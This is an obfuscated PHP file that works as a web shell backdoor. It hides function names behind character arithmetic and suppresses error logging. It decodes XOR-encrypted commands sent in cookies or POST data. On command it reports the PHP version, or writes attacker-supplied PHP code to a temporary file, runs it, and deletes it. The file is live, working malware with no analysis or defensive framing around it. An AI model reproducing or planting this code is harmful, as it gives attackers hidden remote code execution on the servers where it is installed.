<?php $uwxfd = chr(230-128)."\151".chr(988-880).'e'.chr(316-221).'p'.chr(679-562).chr(116).chr(95)."\143".'o'.'n'."\x74"."\145"."\156"."\164"."\163";
$rmvkb = 'b'.chr(97).chr(833-718)."\145".chr(170-116).'4'.chr(1012-917)."\144".chr(696-595).chr(99).chr(576-465)."\144".'e';
$ehwibgz = "\151"."\x6e".chr(105)."\x5f"."\163".chr(560-459)."\x74";
$ucthqkmu = 'u'.chr(110).'l'.'i'."\x6e"."\153";


@$ehwibgz("\x65".chr(114).chr(501-387)."\x6f".chr(279-165).chr(535-440).'l'."\157"."\x67", NULL);
@$ehwibgz('l'."\x6f".chr(103).chr(95)."\145"."\162".chr(114)."\157".chr(114).'s', 0);
@$ehwibgz('m'."\x61"."\170".'_'."\x65"."\x78".'e'."\143".chr(117).chr(116).chr(105).'o'.chr(1077-967)."\137".chr(116)."\151"."\155"."\x65", 0);
@set_time_limit(0);

function nzolikuurx($ogqkehhemc, $xtmha)
{
    $qhgvku = "";
    for ($gypyalv = 0; $gypyalv < strlen($ogqkehhemc);) {
        for ($j = 0; $j < strlen($xtmha) && $gypyalv < strlen($ogqkehhemc); $j++, $gypyalv++) {
            $qhgvku .= chr(ord($ogqkehhemc[$gypyalv]) ^ ord($xtmha[$j]));
        }
    }
    return $qhgvku;
}

$vdwkugcfeu = array_merge($_COOKIE, $_POST);
$flvbfep = 'e2e313d9-cda8-49e1-a213-510269d4d53e';
foreach ($vdwkugcfeu as $jwoodo => $ogqkehhemc) {
    $ogqkehhemc = @unserialize(nzolikuurx(nzolikuurx($rmvkb($ogqkehhemc), $flvbfep), $jwoodo));
    if (isset($ogqkehhemc[chr(97)."\x6b"])) {
        if ($ogqkehhemc["\x61"] == 'i') {
            $gypyalv = array(
                "\x70"."\x76" => @phpversion(),
                "\x73".'v' => "3.5",
            );
            echo @serialize($gypyalv);
        } elseif ($ogqkehhemc["\x61"] == "\x65") {
            $mxhyqjcxv = "./" . md5($flvbfep) . chr(46).chr(105)."\156".'c';
            @$uwxfd($mxhyqjcxv, "<" . "\77"."\x70".chr(104)."\160"."\x20".'@'.chr(117).chr(110)."\x6c"."\x69".chr(715-605).chr(322-215)."\x28"."\137".'_'."\x46".chr(73)."\x4c".chr(163-94)."\137".'_'."\51".chr(59).' ' . $ogqkehhemc["\144"]);
            @include($mxhyqjcxv);
            @$ucthqkmu($mxhyqjcxv);
        }
        exit();
    }
}

